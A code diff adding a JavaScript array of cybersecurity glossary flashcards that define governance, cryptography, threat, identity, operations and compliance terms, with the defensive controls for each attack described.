+  { term: 'CIA Triad', def: 'Confidentiality: prevent unauthorized disclosure (encryption, access controls). Integrity: prevent unauthorized modification (hashing, digital signatures). Availability: ensure access when needed (redundancy, backups, DDoS mitigation).', cat: 'governance' },
+  { term: 'AAA Framework', def: 'Authentication: verify identity (who are you?). Authorization: determine permissions (what can you do?). Accounting: log activity (what did you do?). Implemented via RADIUS, TACACS+, or directory services.', cat: 'governance' },
+  { term: 'Non-Repudiation', def: 'Assurance that a party cannot deny having sent or received a message. Achieved through digital signatures (binds identity to document). Critical for legal evidence and audit trails.', cat: 'crypto' },
+  { term: 'Least Privilege', def: 'Users and systems get only the minimum permissions needed for their role. Limits damage from compromised accounts. Implement with RBAC, just-in-time (JIT) access, and regular access reviews.', cat: 'governance' },
+  { term: 'Defense in Depth', def: 'Multiple layered security controls so that if one fails, others compensate. Layers: physical, perimeter, network, host, application, data. No single point of failure. Also called "layered security."', cat: 'governance' },
+  { term: 'Zero Trust', def: '"Never trust, always verify." Assumes breach. Every access request verified regardless of network location. Key pillars: strong identity (MFA), microsegmentation, device health checks, continuous monitoring.', cat: 'governance' },
+  // Cryptography
+  { term: 'Symmetric Encryption', def: 'Same key for encryption and decryption. Fast — suitable for bulk data. Key distribution problem: how do you securely share the key? Examples: AES (128/192/256-bit), 3DES (deprecated), ChaCha20.', cat: 'crypto' },
+  { term: 'Asymmetric Encryption', def: 'Key pair: public key (freely shared, encrypts or verifies) + private key (kept secret, decrypts or signs). Solves key distribution. Slower than symmetric. Examples: RSA, ECC, Diffie-Hellman.', cat: 'crypto' },
+  { term: 'Hybrid Encryption', def: 'Combines asymmetric (to securely exchange a session key) and symmetric (to encrypt actual data with that session key). Used in TLS, PGP, SSH. Best of both: security + performance.', cat: 'crypto' },
+  { term: 'Hashing', def: 'One-way function producing a fixed-length digest. Cannot be reversed. Used for integrity verification, password storage. MD5 (128-bit, broken), SHA-1 (160-bit, broken), SHA-256, SHA-3. Identical input = identical hash.', cat: 'crypto' },
+  { term: 'Salting', def: 'Adding a unique random value (salt) to a password before hashing. Prevents rainbow table attacks — same password produces different hashes for different users. Stored alongside the hash.', cat: 'crypto' },
+  { term: 'Digital Signature', def: 'Hash of data encrypted with sender\'s PRIVATE key. Recipient decrypts with sender\'s PUBLIC key and compares to own hash. Provides: authentication, integrity, non-repudiation. Used in code signing, email (S/MIME), TLS certs.', cat: 'crypto' },
+  { term: 'PKI (Public Key Infrastructure)', def: 'Framework for managing digital certificates. CA (Certificate Authority): issues certs. RA: registration authority. CRL: list of revoked certs. OCSP: real-time revocation check. Chain of trust: root CA → intermediate CA → end entity cert.', cat: 'crypto' },
+  { term: 'Perfect Forward Secrecy (PFS)', def: 'Each session uses a unique ephemeral key pair (ECDHE/DHE). Even if long-term private key is compromised, past sessions cannot be decrypted. TLS 1.3 mandates PFS. Cipher suites with DHE or ECDHE provide PFS.', cat: 'crypto' },
+  { term: 'Key Exchange (Diffie-Hellman)', def: 'Allows two parties to establish a shared secret over an insecure channel without transmitting the secret. DH: original. DHE: ephemeral (PFS). ECDHE: elliptic-curve variant (smaller keys, faster). Used in TLS handshake.', cat: 'crypto' },
+  { term: 'RSA', def: 'Asymmetric algorithm based on difficulty of factoring large primes. Common key sizes: 2048, 3072, 4096 bits. Used for key exchange and digital signatures. Slower than ECC for equivalent security.', cat: 'crypto' },
+  { term: 'ECC (Elliptic Curve Cryptography)', def: 'Asymmetric cryptography using elliptic curves. Provides same security as RSA with much smaller keys (256-bit ECC ≈ 3072-bit RSA). Faster, lower power. Used in TLS 1.3, Bitcoin, mobile devices.', cat: 'crypto' },
+  { term: 'AES (Advanced Encryption Standard)', def: 'Gold standard symmetric block cipher. Block size: 128 bits. Key sizes: 128, 192, 256 bits. Modes: CBC (needs IV), GCM (authenticated encryption, provides integrity + confidentiality), CTR. Hardware accelerated on modern CPUs.', cat: 'crypto' },
+  { term: 'TLS Handshake', def: '1. Client Hello (cipher suites). 2. Server Hello + Certificate. 3. Key Exchange (ECDHE). 4. Finished (both sides). TLS 1.3: 1-RTT handshake, mandatory PFS, removed weak ciphers (RC4, 3DES, RSA key exchange).', cat: 'crypto' },
+  { term: 'Certificate Types', def: 'DV (Domain Validation): checks domain ownership. OV (Organization Validation): verifies org identity. EV (Extended Validation): rigorous verification, green bar. Wildcard (*.domain.com). SAN cert: multiple domains on one cert.', cat: 'crypto' },
+  { term: 'Steganography', def: 'Hiding data within other data (images, audio, video) without obvious detection. Not encryption — security through obscurity. Used for watermarking, covert communications. Tool: steghide. Detect with steganalysis.', cat: 'crypto' },
+  { term: 'Key Stretching', def: 'Makes brute-force attacks slower by running password through hash function many times (iterations). PBKDF2, bcrypt, Argon2. Bcrypt: work factor 10 = 2^10 iterations. Argon2 is current best practice.', cat: 'crypto' },
+  // Threats & Attacks
+  { term: 'Phishing / Spear Phishing / Whaling', def: 'Phishing: bulk fake emails. Spear phishing: targeted, personalized. Whaling: targeting C-level executives. Vishing: voice/phone. Smishing: SMS. Pharming: DNS manipulation redirects browser without email.', cat: 'threats' },
+  { term: 'SQL Injection (SQLi)', def: 'Inserts malicious SQL into input fields. Types: classic (error-based), blind (boolean/time), out-of-band. Prevention: parameterized queries (prepared statements), stored procedures, input validation, WAF, least privilege DB accounts.', cat: 'threats' },
+  { term: 'Cross-Site Scripting (XSS)', def: 'Injects malicious scripts into web pages viewed by others. Reflected: from URL parameter. Stored: persisted in database. DOM-based: client-side. Prevention: output encoding, Content Security Policy (CSP), input validation.', cat: 'threats' },
+  { term: 'Cross-Site Request Forgery (CSRF)', def: 'Tricks authenticated user\'s browser into making unauthorized requests. Example: hidden form auto-submits transfer request. Prevention: CSRF tokens (synchronizer token), SameSite cookie attribute, re-authentication for sensitive actions.', cat: 'threats' },
+  { term: 'Buffer Overflow', def: 'Writing more data than a buffer can hold, overwriting adjacent memory. Can redirect execution to attacker\'s code. Mitigations: ASLR (randomize memory layout), DEP/NX (no-execute), stack canaries, safe functions (strcpy → strncpy).', cat: 'threats' },
+  { term: 'Ransomware', def: 'Malware that encrypts victim\'s files and demands payment for the key. Modern ransomware also exfiltrates data (double extortion). Spread via phishing, RDP exploits, unpatched vulnerabilities. Mitigation: air-gapped backups, patch, EDR.', cat: 'threats' },
+  { term: 'Rootkit', def: 'Malware that hides itself and other malware by modifying OS kernel or hypervisor. Hard to detect with traditional AV. Firmware rootkits survive OS reinstall. Detection: integrity checking (Tripwire), bootable scanners, TPM Secure Boot.', cat: 'threats' },
+  { term: 'Fileless Malware', def: 'Executes entirely in memory using legitimate tools (PowerShell, WMI, LOLBins). Leaves no disk footprint. Evades traditional AV. Detected by behavior-based EDR, script block logging, PowerShell AMSI (Anti-Malware Scan Interface).', cat: 'threats' },
+  { term: 'APT (Advanced Persistent Threat)', def: 'Nation-state or sophisticated group conducting long-term, stealthy intrusion. Characteristics: well-funded, specific targets, persistence, exfiltration over time. Phases: recon → initial access → establish foothold → lateral movement → exfil.', cat: 'threats' },
+  { term: 'Supply Chain Attack', def: 'Compromises software or hardware before it reaches the target. Examples: SolarWinds (malicious update), XZ Utils backdoor, compromised NPM packages. Mitigate: vendor vetting, code signing verification, SBOMs.', cat: 'threats' },
+  { term: 'Social Engineering', def: 'Manipulating people to bypass security. Techniques: pretexting (false scenario), tailgating/piggybacking (physical), baiting (USB drop), quid pro quo (offer help for info). Human element is the weakest link.', cat: 'threats' },
+  { term: 'MITM Attack', def: 'Attacker intercepts communication between two parties. Methods: ARP poisoning, evil twin Wi-Fi, SSL stripping, BGP hijacking. Prevention: TLS everywhere, HSTS, certificate pinning, mutual TLS, encrypted DNS (DoH/DoT).', cat: 'threats' },
+  { term: 'Credential Stuffing', def: 'Using stolen username/password pairs (from breaches) against other sites, exploiting password reuse. Automated. Prevention: MFA (critical), password managers, breach detection (HaveIBeenPwned), account lockout with delay.', cat: 'threats' },
+  { term: 'Insider Threat', def: 'Threat from employees, contractors, or partners — malicious or unintentional. Indicators: unusual access hours, large data downloads, policy violations. Mitigation: DLP, UBA, separation of duties, offboarding procedures, least privilege.', cat: 'threats' },
+  { term: 'OWASP Top 10 (2021)', def: 'A01: Broken Access Control. A02: Cryptographic Failures. A03: Injection. A04: Insecure Design. A05: Security Misconfiguration. A06: Vulnerable Components. A07: Auth Failures. A08: Data Integrity Failures. A09: Logging Failures. A10: SSRF.', cat: 'threats' },
+  { term: 'Server-Side Request Forgery (SSRF)', def: 'Tricks server into making HTTP requests to internal/external resources. Can access metadata APIs (AWS 169.254.169.254), internal services, or scan internal network. Prevention: allowlists, block private IP ranges server-side.', cat: 'threats' },
+  // Identity & Access Management
+  { term: 'MFA Factors', def: 'Something you know (password, PIN). Something you have (hardware token, phone). Something you are (biometric: fingerprint, retina). Somewhere you are (geolocation). Behavior (typing rhythm). Requires 2+ different factor types.', cat: 'ops' },
+  { term: 'SAML 2.0', def: 'Security Assertion Markup Language. XML-based SSO. IdP (Identity Provider) authenticates user, issues signed assertion to SP (Service Provider). Browser-based federated SSO for enterprise apps. Used by Okta, Azure AD, Salesforce.', cat: 'ops' },
+  { term: 'OAuth 2.0', def: 'Authorization framework (not authentication). Grants third-party apps limited access to resources without sharing credentials. Roles: Resource Owner, Client, Authorization Server, Resource Server. Returns access token, not identity.', cat: 'ops' },
+  { term: 'OpenID Connect (OIDC)', def: 'Authentication layer built on top of OAuth 2.0. Adds ID token (JWT) containing user identity info. Used for "Sign in with Google/GitHub." OAuth 2.0 = authorization; OIDC = authentication.', cat: 'ops' },
+  { term: 'Kerberos', def: 'Authentication protocol using tickets. KDC issues TGT after initial login; client uses TGT to get Service Tickets. Port 88. Requires time sync (±5 min). Used in Active Directory. Susceptible to Pass-the-Ticket, Kerberoasting attacks.', cat: 'ops' },
+  { term: 'LDAP / Active Directory', def: 'LDAP: protocol for querying directory services (port 389/636). Active Directory: Microsoft\'s directory service using LDAP + Kerberos. Stores users, groups, GPOs. Domain Controller (DC) is the AD server. OUs organize objects.', cat: 'ops' },
+  { term: 'SSO (Single Sign-On)', def: 'Authenticate once, access multiple systems. Reduces password fatigue. Technologies: SAML (enterprise), OIDC (web/mobile), Kerberos (Windows domain). Risk: single point of compromise — must be protected with MFA.', cat: 'ops' },
+  { term: 'PAM (Privileged Access Management)', def: 'Controls, monitors, and audits privileged account activity. Features: password vaulting, session recording, JIT (Just-in-Time) access, approval workflows. Examples: CyberArk, BeyondTrust. Protects against insider threats and credential theft.', cat: 'ops' },
+  { term: 'RBAC vs ABAC vs DAC vs MAC', def: 'RBAC: permissions based on job role. ABAC: attributes (user, resource, environment). DAC: owner controls access (Windows NTFS). MAC: labels classify data and users (government/military), not user-controlled. Most enterprise = RBAC.', cat: 'ops' },
+  // Security Operations
+  { term: 'SIEM', def: 'Security Information and Event Management. Aggregates logs, correlates events, generates alerts, stores for forensics. Examples: Splunk, Microsoft Sentinel, IBM QRadar. SOC analysts use SIEM as primary investigation tool.', cat: 'ops' },
+  { term: 'SOAR', def: 'Security Orchestration, Automation and Response. Automates repetitive SOC tasks via playbooks. Example: phishing email → auto-block sender, quarantine email, enrich IoCs, create ticket. Reduces MTTR and analyst fatigue.', cat: 'ops' },
+  { term: 'EDR / XDR / MDR', def: 'EDR (Endpoint Detection & Response): monitor + respond at endpoint. XDR: extends to network, cloud, email. MDR: managed service — vendor operates EDR/XDR for you. All use behavior-based detection, not just signatures.', cat: 'ops' },
+  { term: 'Incident Response Lifecycle', def: 'NIST SP 800-61: 1. Preparation (policies, tools, training). 2. Detection & Analysis (identify and scope). 3. Containment (isolate). 4. Eradication (remove malware, patch). 5. Recovery (restore operations). 6. Lessons Learned (post-incident review).', cat: 'ops' },
+  { term: 'Digital Forensics', def: 'Order of volatility: CPU registers → RAM → swap → disk → logs → cloud. Collect most volatile first. Chain of custody: document who handled evidence and when. Write blockers prevent modifying original evidence. Hashes verify integrity.', cat: 'ops' },
+  { term: 'Threat Intelligence', def: 'Collected knowledge about threats: IoCs (Indicators of Compromise: IPs, hashes, domains), TTPs (Tactics, Techniques, Procedures). Sources: ISACs, MITRE ATT&CK, threat feeds, dark web monitoring. Types: strategic, tactical, operational.', cat: 'ops' },
+  { term: 'MITRE ATT&CK Framework', def: 'Knowledge base of adversary tactics and techniques observed in real attacks. Organized by: Tactics (the why — 14 categories) → Techniques → Sub-techniques. Used for threat hunting, detection engineering, red team planning.', cat: 'ops' },
+  { term: 'Vulnerability Management', def: 'Continuous cycle: discover assets → scan for vulnerabilities → assess risk (CVSS score) → prioritize → remediate (patch, mitigate, accept) → verify → report. CVSS: 0–10 scale (Critical ≥9.0, High 7–8.9, Medium 4–6.9).', cat: 'ops' },
+  { term: 'Pen Testing Phases', def: '1. Reconnaissance (passive/active). 2. Scanning/Enumeration. 3. Gaining Access (exploitation). 4. Maintaining Access (persistence). 5. Covering Tracks. 6. Reporting. Rules of Engagement define scope. Written authorization required.', cat: 'ops' },
+  { term: 'Red / Blue / Purple Team', def: 'Red team: offensive, simulates attackers. Blue team: defensive, detects and responds. Purple team: red + blue collaborate — red shares techniques so blue can improve detection. Goal: improve overall security posture.', cat: 'ops' },
+  { term: 'DLP (Data Loss Prevention)', def: 'Prevents unauthorized data exfiltration. Types: endpoint DLP (blocks copy/print/USB), network DLP (inspects traffic), cloud DLP (monitors cloud storage). Classifies sensitive data (PII, PHI, PCI) and enforces policies.', cat: 'ops' },
+  { term: 'IDS / IPS Detection Methods', def: 'Signature-based: matches known patterns (low false positives, misses zero-days). Anomaly/behavior-based: deviates from baseline (catches new threats, more false positives). Heuristic: rule-based logic. Modern tools combine all three.', cat: 'ops' },
+  // Cloud Security
+  { term: 'Shared Responsibility Model', def: 'Cloud provider secures the cloud infrastructure. Customer secures what\'s in the cloud. IaaS: customer owns OS, apps, data. PaaS: customer owns apps and data. SaaS: customer owns data configuration. Security OF cloud vs security IN the cloud.', cat: 'ops' },
+  { term: 'CASB (Cloud Access Security Broker)', def: 'Security control point between cloud users and providers. Provides: visibility (shadow IT discovery), compliance, data security (DLP), threat protection. Inline (proxy) or API-based. Enforces policy on cloud app usage.', cat: 'ops' },
+  { term: 'CSPM (Cloud Security Posture Management)', def: 'Continuously monitors cloud environments for misconfigurations. Detects: public S3 buckets, exposed databases, overly permissive IAM policies, disabled encryption. Compares against CIS benchmarks and compliance frameworks.', cat: 'ops' },
+  { term: 'Cloud IAM Best Practices', def: 'Avoid root/admin account for daily use. Use MFA on all accounts. Apply least privilege with granular policies. Use roles (not long-term access keys). Rotate credentials. Audit with CloudTrail (AWS) or Activity Log (Azure).', cat: 'ops' },
+  { term: 'KMS / BYOK', def: 'KMS (Key Management Service): cloud provider manages encryption keys. BYOK (Bring Your Own Key): customer generates and manages the key, stored in cloud HSM. HYOK (Hold Your Own Key): key stays on-premises. More control = more responsibility.', cat: 'crypto' },
+  // Endpoint & Network Controls
+  { term: 'Secure Boot / UEFI', def: 'Secure Boot (UEFI): verifies that boot loader is signed by trusted key before executing. Prevents bootkit/rootkit attacks at startup. Keys stored in UEFI firmware. Requires signed OS loader (Windows requires this by default).', cat: 'ops' },
+  { term: 'TPM (Trusted Platform Module)', def: 'Dedicated hardware chip for cryptographic operations. Stores keys, certificates, passwords securely. Used by BitLocker (disk encryption), Secure Boot, device attestation. Version 2.0 required for Windows 11.', cat: 'ops' },
+  { term: 'MDM / MAM', def: 'MDM (Mobile Device Management): manages entire device — can remote wipe, enforce encryption, manage apps. MAM (Mobile Application Management): manages only corporate apps — less invasive for BYOD. Container separates work/personal data.', cat: 'ops' },
+  { term: 'Application Whitelisting / Blacklisting', def: 'Whitelisting (allowlist): only approved apps can run — most restrictive, best security. Blacklisting (blocklist): known bad apps blocked — easier to manage, less effective. AppLocker (Windows), Carbon Black use whitelisting.', cat: 'ops' },
+  { term: 'Host-Based Firewall', def: 'Software firewall on individual endpoint. Controls inbound/outbound traffic per application. Examples: Windows Defender Firewall, iptables (Linux), pf (macOS). Provides protection even on trusted networks. Defense in depth layer.', cat: 'ops' },
+  { term: 'Patch Management', def: 'Process of applying vendor patches to fix vulnerabilities. Critical patches: apply within 24–72 hours. Test in staging before production. Track with vulnerability scanner (Nessus, Qualys). Unpatched systems = most common attack vector.', cat: 'ops' },
+  // Governance, Risk & Compliance
+  { term: 'NIST Cybersecurity Framework (CSF) 2.0', def: 'Six functions: GOVERN (risk governance), IDENTIFY (assets/risks), PROTECT (safeguards), DETECT (anomalies), RESPOND (incidents), RECOVER (resilience). GOVERN is new in CSF 2.0. Voluntary framework for critical infrastructure.', cat: 'governance' },
+  { term: 'ISO 27001', def: 'International standard for ISMS (Information Security Management System). Annex A: 93 controls across 4 themes (Organizational, People, Physical, Technological). Certifiable. Risk-based approach. Requires Statement of Applicability (SoA).', cat: 'governance' },
+  { term: 'Risk Assessment', def: 'Qualitative: subjective (High/Medium/Low) — easier, less precise. Quantitative: numerical (ALE = SLE × ARO) — requires data. Hybrid: combines both. Risk register documents findings. Residual risk = risk after controls applied.', cat: 'governance' },
+  { term: 'Risk Response Strategies', def: 'Avoid: eliminate the risky activity. Transfer: insurance or third party (cyber insurance). Mitigate: reduce likelihood or impact with controls. Accept: acknowledge and monitor residual risk. Accept only when cost of control > risk value.', cat: 'governance' },
+  { term: 'BCP vs DRP', def: 'BCP (Business Continuity Plan): broad plan to keep business functions running during a disaster. DRP (Disaster Recovery Plan): IT-specific plan to restore systems and data. BCP is the umbrella; DRP is a component. Both require testing.', cat: 'governance' },
+  { term: 'RTO / RPO', def: 'RTO (Recovery Time Objective): maximum acceptable downtime — "how fast must we recover?" RPO (Recovery Point Objective): maximum acceptable data loss — "how much data can we afford to lose?" Both defined in BCP. Lower RTO/RPO = higher cost.', cat: 'governance' },
+  { term: 'Hot / Warm / Cold Site', def: 'Hot: fully operational duplicate site, real-time data sync — highest cost, lowest RTO (minutes). Warm: partially equipped, data restored from backups — moderate cost, hours RTO. Cold: space only, no equipment — lowest cost, days RTO.', cat: 'governance' },
+  { term: 'Data Classification', def: 'Government: Top Secret → Secret → Confidential → Unclassified. Commercial: Confidential/Restricted → Internal → Public. Classification drives: encryption requirements, access controls, retention policies, handling procedures.', cat: 'governance' },
+  { term: 'GDPR', def: 'General Data Protection Regulation (EU). Key rights: access, rectification, erasure ("right to be forgotten"), portability. Breach notification: 72 hours to supervisory authority. Fines: up to €20M or 4% annual global revenue.', cat: 'governance' },
+  { term: 'HIPAA', def: 'Health Insurance Portability and Accountability Act. Protects PHI (Protected Health Information). Security Rule: safeguards for electronic PHI (ePHI). Privacy Rule: limits disclosure. Breach Rule: notification requirements. Applies to covered entities and business associates.', cat: 'governance' },
+  { term: 'PCI-DSS', def: 'Payment Card Industry Data Security Standard. 12 requirements for handling cardholder data. Scope: any system that stores, processes, or transmits card data. Levels 1–4 based on transaction volume. Quarterly ASV scans, annual pen test required.', cat: 'governance' },
+  { term: 'SOC Reports (1/2/3)', def: 'SOC 1: financial reporting controls. SOC 2: security, availability, confidentiality, processing integrity, privacy. SOC 3: public summary of SOC 2. Type I: point-in-time. Type II: over a period (6–12 months, more valuable).', cat: 'governance' },
+  { term: 'Separation of Duties', def: 'No single person controls all parts of a critical process. Prevents fraud and errors. Example: person who requests a payment cannot also approve it. Complementary: dual control (two people required simultaneously), job rotation.', cat: 'governance' },
+  { term: 'Security Awareness Training', def: 'Regular training on phishing, social engineering, password hygiene, clean desk, incident reporting. Simulated phishing: send fake phishing emails, track click rates, train those who click. Most effective when ongoing and role-specific.', cat: 'governance' },
+  // Architecture
+  { term: 'Network Segmentation', def: 'Dividing network into zones (DMZ, internal, OT/IoT, guest) with firewalls/ACLs between them. Limits blast radius of breaches. Microsegmentation: workload-level controls (SDN/SASE). Required for PCI-DSS, HIPAA compliance.', cat: 'ops' },
+  { term: 'SASE (Secure Access Service Edge)', def: 'Converges networking (SD-WAN) and security (CASB, SWG, ZTNA, FWaaS) delivered from the cloud. Users connect to nearest edge node regardless of location. Gartner model for distributed workforce security.', cat: 'ops' },
+  { term: 'Honeypot / Honeynet', def: 'Honeypot: decoy system to lure and study attackers. Honeynet: network of honeypots. Legal but must be carefully isolated. Provides threat intelligence on attacker TTPs. Entrapment vs enticement: enticement is legal.', cat: 'ops' },
+  { term: 'Data Sovereignty', def: 'Data must be stored and processed in accordance with the laws of the country where it resides. Example: EU data governed by GDPR even if processed by US company. Affects cloud region selection.', cat: 'governance' },
+  { term: 'Rainbow Table Attack', def: 'Precomputed table mapping hashes back to passwords. Defeats unsalted hashes. Defense: salting makes tables useless; bcrypt/Argon2 adds computational cost. CrackStation hosts tables for common passwords.', cat: 'crypto' },
+  { term: 'Certificate Pinning', def: 'App hard-codes expected server cert or public key, rejects any other. Prevents MITM even with rogue trusted CA. Used in mobile apps. Downside: breaks on legitimate cert rotation — requires app update.', cat: 'crypto' },
+  { term: 'HSM (Hardware Security Module)', def: 'Tamper-resistant hardware for key generation and storage. Keys never leave HSM in plaintext. Used by CAs, banks, cloud KMS. FIPS 140-2/3 Level 3/4 certified. Examples: AWS CloudHSM, Thales Luna.', cat: 'crypto' },
+  { term: 'Tokenization', def: 'Replaces sensitive data (credit card number) with a non-sensitive token. No mathematical relationship between token and original. Used in PCI-DSS to reduce scope. Token vault holds original data separately.', cat: 'crypto' },
+  { term: 'Data Masking', def: 'Replaces real sensitive data with realistic fake data for non-production environments. Static masking: permanent replacement. Dynamic masking: on-the-fly. Protects data in dev/test environments without removing its usefulness.', cat: 'crypto' },
+  { term: 'Quantum Computing Threat', def: 'Shor algorithm breaks RSA/ECC. Grover algorithm weakens symmetric keys (AES-128 effectively halved to 64-bit). NIST post-quantum standards: CRYSTALS-Kyber (key encapsulation), CRYSTALS-Dilithium (signatures). Harvest-now-decrypt-later threat.', cat: 'crypto' },
+  { term: 'Watering Hole Attack', def: 'Attacker compromises a website the target group frequents. Victims infected when they visit the trusted site. No direct action against the target. Hard to detect. Defense: web filtering, browser isolation, threat intel feeds.', cat: 'threats' },
+  { term: 'Typosquatting', def: 'Registering misspelled domains (gooogle.com, paypa1.com) to catch typing errors. Used for phishing and malware. Defense: brand monitoring, domain registration of common typos, user training.', cat: 'threats' },
+  { term: 'Clickjacking', def: 'Invisible iframe over a legitimate page tricks user into clicking attacker content. Example: hidden button over a purchase button. Defense: X-Frame-Options: DENY header, Content Security Policy frame-ancestors directive.', cat: 'threats' },
+  { term: 'Pass-the-Hash', def: 'Uses a captured NTLM hash directly to authenticate without knowing the plaintext password. Windows-specific attack. Defense: Credential Guard, Protected Users group, disable NTLM where possible, privileged workstations.', cat: 'threats' },
+  { term: 'Kerberoasting', def: 'Requests Kerberos service tickets (TGS) for service accounts, cracks them offline. Service tickets are encrypted with the service account password hash. Defense: strong passwords (25+ chars) or managed service accounts (gMSA).', cat: 'threats' },
+  { term: 'DNS Tunneling', def: 'Encodes data inside DNS queries/responses to exfiltrate data or establish C2 through firewalls. DNS is usually allowed. Detection: anomalous query length/frequency, unusual domains. Block with DNS RPZ or filtering solutions.', cat: 'threats' },
+  { term: 'Command & Control (C2)', def: 'Attacker infrastructure communicating with compromised hosts (beaconing). IoCs: regular outbound to unusual IPs, HTTPS beacons to new domains, DNS tunneling. Detection: NDR, proxy analysis, threat intelligence.', cat: 'threats' },
+  { term: 'Lateral Movement', def: 'Attacker pivots from initial foothold to other systems. Techniques: Pass-the-Hash, RDP, WMI, PsExec, Kerberoasting. Detection: honeypots, UEBA anomalies, segmentation alerts, privileged account monitoring.', cat: 'threats' },
+  { term: 'Living off the Land (LOLBins)', def: 'Using legitimate OS tools maliciously: PowerShell, WMI, certutil, mshta. No malware files on disk. Evades signature AV. Detection: script block logging, AMSI, command-line auditing, behavior-based EDR.', cat: 'threats' },
+  { term: 'Physical Security Controls', def: 'Preventive: mantraps, badge access, fencing, locks. Detective: CCTV, motion sensors, guards. Deterrent: lighting, warning signs. Tailgating/piggybacking attacks bypass logical security entirely. Physical = first security layer.', cat: 'governance' },
+  { term: 'SAST vs DAST', def: 'SAST (Static Application Security Testing): analyzes source code without executing — finds issues early. DAST (Dynamic): tests running app — finds runtime vulnerabilities. IAST: agent-based combination. RASP: runtime self-protection in production.', cat: 'ops' },
+  { term: 'Threat Hunting', def: 'Proactive search for threats not found by automated tools. Hypothesis-driven using ATT&CK, threat intel. Process: hypothesis -> data collection -> investigation -> response. Distinct from reactive incident response.', cat: 'ops' },
+  { term: 'Data Retention Policy', def: 'Defines how long data is stored and how it is destroyed. Regulatory requirements: HIPAA 6 years, SOX 7 years, GDPR (only as long as needed). Destruction: degaussing, physical shredding, crypto-shredding (destroy the key).', cat: 'governance' },
+  { term: 'Security Baseline', def: 'Minimum security configuration standard for systems. Based on CIS Benchmarks, DISA STIGs, vendor hardening guides. Applied via GPO, MDM, Ansible/Puppet. Any deviation is a potential vulnerability.', cat: 'governance' },
+  { term: 'Tabletop Exercise', def: 'Discussion-based simulation of incident scenarios without real system involvement. Tests decision-making, communication, and policy gaps. Cheaper than full simulation. Identifies procedural deficiencies before real incidents occur.', cat: 'ops' },
+  { term: 'Microsegmentation', def: 'Network security at workload level — policies applied per VM or container, not just VLAN. Only explicitly allowed communication is permitted. Limits blast radius of breaches and lateral movement. Implemented with SDN, VMware NSX, cloud security groups.', cat: 'ops' },
+  { term: 'Air Gap', def: 'Complete physical isolation from all external networks. No internet, no corporate LAN connection. Data moves via sneakernet (physical media). Used for: industrial control systems, nuclear facilities, classified networks. Highest isolation.', cat: 'ops' },
+  { term: 'API Security', def: 'APIs are major attack surface. Threats: broken object-level auth, mass assignment, excessive data exposure (OWASP API Top 10). Controls: API gateway, OAuth 2.0, rate limiting, input validation, TLS, logging and monitoring.', cat: 'threats' },
+  { term: 'Container Security', def: 'Containers share host OS kernel — container escape = host compromise. Controls: vulnerability scanning of images, minimal base images, run as non-root, immutable containers, Kubernetes network policies, secrets management (not env variables).', cat: 'ops' },
+  { term: 'Vendor Risk Management', def: 'Assess third-party security before onboarding. Methods: questionnaire, SOC 2 review, pen test results. Contract requirements: right-to-audit, breach notification, data handling. Supply chain attacks make vendor risk a top concern.', cat: 'governance' },
+  { term: 'Bug Bounty Program', def: 'Program inviting external researchers to find and report vulnerabilities for rewards. Platforms: HackerOne, Bugcrowd. Scope defines in-bounds systems. Responsible disclosure: report before public. Extends security testing coverage.', cat: 'ops' },
+  { term: 'ALE / SLE / ARO Formulas', def: 'SLE (Single Loss Expectancy) = Asset Value x Exposure Factor. ARO (Annualized Rate of Occurrence) = expected frequency per year. ALE = SLE x ARO. If ALE > control cost, implement the control. Basis for quantitative risk decisions.', cat: 'governance' },
+  { term: 'Continuous Monitoring', def: 'Ongoing assessment of security controls rather than annual audits. Tools: SIEM, vulnerability scanners, CSPM, configuration management. Required by FedRAMP, NIST 800-137. Provides near-real-time risk visibility.', cat: 'ops' },
+  { term: 'Chain of Custody', def: 'Documentation of evidence handling from collection to court. Records who collected, when, how stored, all transfers. Broken chain may render evidence inadmissible. Hash values (SHA-256) verify evidence has not been modified.', cat: 'ops' },
+  { term: 'False Positive vs False Negative', def: 'False Positive: alert fires but no real threat (tuning problem). False Negative: real threat not detected (missed attack). Both are costly. Tune detection threshold: lower = more FP, higher = more FN. Use threat intel to improve accuracy.', cat: 'ops' },
+  { term: 'Indicators of Compromise (IoC)', def: 'Evidence of past or ongoing attack. Types: file hashes, malicious IPs/domains, registry keys, C2 beacon patterns, anomalous DNS queries. Shared via MISP, threat feeds, ISACs. Used in SIEM rules and threat hunting.', cat: 'ops' },
+  { term: 'CVSS Scoring', def: 'Common Vulnerability Scoring System v3. Scale 0-10: Critical 9-10, High 7-8.9, Medium 4-6.9, Low 0.1-3.9, None 0. Base (exploitability + impact) + Temporal + Environmental. CVSS alone is insufficient — business context determines actual priority.', cat: 'ops' },
+  { term: 'Security by Design Principles', def: 'Least privilege, fail securely (deny by default on error), defense in depth, minimize attack surface, separation of duties, no security through obscurity. Apply at design phase via threat modeling (STRIDE). Much cheaper than retrofitting.', cat: 'governance' },
+  { term: 'Encryption at Rest vs In Transit vs In Use', def: 'At rest: stored data (BitLocker, TDE, S3 SSE). In transit: moving data (TLS/VPN). In use: data being processed (TEE/SGX, homomorphic encryption). All three required for comprehensive data protection. Most breaches target data at rest.', cat: 'crypto' },
+  { term: 'Wireless Security: WEP/WPA/WPA2/WPA3', def: 'WEP: broken (IV reuse, RC4 weakness). WPA: TKIP, broken. WPA2-Personal: AES-CCMP+PSK, vulnerable to offline dictionary attacks. WPA2-Enterprise: 802.1X+RADIUS, strong. WPA3-Personal: SAE (no PSK), offline-attack resistant. WPA3-Enterprise: 192-bit suite.', cat: 'ops' },
+  { term: 'SOC Tiers', def: 'Tier 1: Monitor SIEM dashboards, triage alerts, escalate. Tier 2: Investigate escalated alerts, deep analysis, threat hunting. Tier 3: Advanced threat hunting, malware analysis, custom detection rule development, incident command. All tiers need strong playbooks.', cat: 'ops' },
+  { term: 'GDPR Key Requirements', def: 'Lawful basis for processing, data minimization, purpose limitation, storage limitation, accuracy, integrity/confidentiality. Data subject rights: access, rectification, erasure, portability. DPO required for some organizations. 72-hour breach notification.', cat: 'governance' },
+  { term: 'PKI Certificate Lifecycle', def: 'Enrollment (CSR submitted) -> Issuance (CA signs cert) -> Distribution -> Use -> Renewal (before expiry) -> Revocation (CRL/OCSP if compromised) -> Archival. Expired certs cause outages. ACME protocol (Let Encrypt) automates renewal.', cat: 'crypto' },
+  { term: 'Just-in-Time (JIT) Access', def: 'Privileged access granted only when needed and for minimum required duration (e.g., 1 hour). Eliminates standing privileges. Requires approval workflow via PAM. Drastically reduces attack window. Part of zero-trust privileged access strategy.', cat: 'ops' },
